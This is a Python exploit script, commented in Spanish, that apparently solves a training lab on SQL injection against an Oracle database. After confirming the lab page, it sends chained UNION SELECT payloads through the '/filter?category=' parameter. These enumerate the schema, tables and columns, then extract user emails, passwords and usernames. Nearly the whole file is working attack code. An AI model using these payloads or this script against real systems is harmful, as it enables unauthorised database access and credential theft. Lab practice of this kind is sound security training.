#!/usr/bin/env python3
# Script para el Laboratorio 6:"SQL injection attack, listing the database contents on Oracle"
import requests
import sys
import urllib3
import re
from bs4 import BeautifulSoup
urllib3.disable_warnings()

gyC="\033[0;37m\033[1m"
yC="\033[0;33m\033[1m"
bC="\033[0;34m\033[1m"
gC="\033[0;32m\033[1m"
rC="\033[0;31m\033[1m"
eC="\033[0m"

proxies={
    "http":"http://127.0.0.1:8080",
    "https":"http://127.0.0.1:8080"
}

laboratorio="SQL injection attack, listing the database contents on Oracle"

# Busca los elementos y retorna su contenido 
def buscarElementos(html,etiqueta,patronString,siguiente=False):    
    #sys.exit(1)
    arbol = BeautifulSoup(html,"lxml")
    nodos = None
    if siguiente:
        nodos = [ nodo.find_next('td') for nodo in arbol.find_all(name=etiqueta,string=patronString) ]
    else:
        nodos = arbol.find_all(
            name=etiqueta,
            string=patronString
        )
    if nodos==None:
        return []
    n=[]
    #print(f"Nodos: {nodos}")
    for i in nodos:
        c = re.search("<[a-zA-Z0-9]+>([^<]*)",str(i)).group(1)
        n.append(c)
    return n

def comprobacionUrlLab(url):
    print(f"\n{yC}[+] {gyC}Comprobando instancia de laboratorio...{eC}")
    try:
        response=requests.get(
            url,
            verify=False,
            timeout=10
        )
        if response.status_code!=200:
            print(f"{rC}[!] {gyC}Verifica que la instancia de laboratorio este activa y la url proporcionada sea correcta{eC}\n")
            sys.exit(1) 
        if len(buscarElementos(response.text,"h2",laboratorio,False)) == 0:
            print(f"{rC}[!] {gyC}El link proporcionado no corresponde al Laboratorio 6:{gC} {laboratorio}{eC}")
            sys.exit(1) 
        else:
            print(f"{yC}[+] {gyC}Url proporcionada valida{eC}")
    except requests.exceptions.Timeout as e:
        print(e)

def main(url):
    comprobacionUrlLab(url)
    url=url+"/filter?category="
    
    esquemasInyeccion="'UNION+SELECT+'UsuarioEsquema',USER+FROM+DUAL--"
    print(f"\n{yC}[+] {gyC}Realizando inyeccion: {bC}{esquemasInyeccion}{eC}")
    response=requests.get(url+esquemasInyeccion,verify=False,proxies=proxies)
    esquemaActual=buscarElementos(response.text,'th','UsuarioEsquema',True)[0]
    print(f"{yC}[+]{gyC} Esquema actual obtenido:{eC} {gC}{esquemaActual}{eC}")
    
    tablasInyeccion=f"'UNION+SELECT+'NTABLA',TABLE_NAME+FROM+ALL_TABLES+WHERE+OWNER='{esquemaActual}'--"
    print(f"\n{yC}[+] {gyC}Realizando inyeccion: {bC}{tablasInyeccion}{eC}")
    response=requests.get(
        url+tablasInyeccion,
        verify=False,
        proxies=proxies
    )    
    tablas=buscarElementos(response.text,"th","NTABLA",True)
    tusers= [ tabla for tabla in tablas if str(tabla).startswith("USER")][0]
    print(f"{yC}[+]{gyC} Tabla de usuarios obtenida:{eC} {gC}{tusers}{eC}")


    columnasInyeccion=f"'UNION+SELECT+'NCOLUMN',COLUMN_NAME+FROM+ALL_TAB_COLUMNS+WHERE+TABLE_NAME='{tusers}'--"
    print(f"\n{yC}[+] {gyC}Realizando inyeccion: {bC}{columnasInyeccion}{eC}")
    response=requests.get(
        url+columnasInyeccion,
        verify=False,
        proxies=proxies
    )
    columnas=buscarElementos(response.text,"th","NCOLUMN",True)
    print(f"{yC}[+]{gyC} Columnas de la tabla '{tusers}':{eC} {gC}{columnas}{eC}")


    credencialesInyeccion=f"'UNION+SELECT+'CREDENCIAL',{columnas[0]}||':'||{columnas[1]}||':'||{columnas[2]}+FROM+{tusers}--"
    print(f"\n{yC}[+] {gyC}Realizando inyeccion: {bC}{credencialesInyeccion}{eC}")
    response=requests.get(
        url+credencialesInyeccion,
        verify=False,
        proxies=proxies
    )
    print(f"{yC}[+]{gyC} Credenciales(email:pass:user): {eC}")
    credenciales=buscarElementos(response.text,"th","CREDENCIAL",True)
    for i in credenciales:
        print(f"\t{gC}{i}{eC}")
    print()

if __name__ == "__main__":
    if len(sys.argv)!=2:
        print(f"\n{yC}[+] {gyC}Uso: {bC}{sys.argv[0]} {gC}<url>{eC}\n")
        sys.exit(1)
    url=sys.argv[1].strip("/")
    main(url)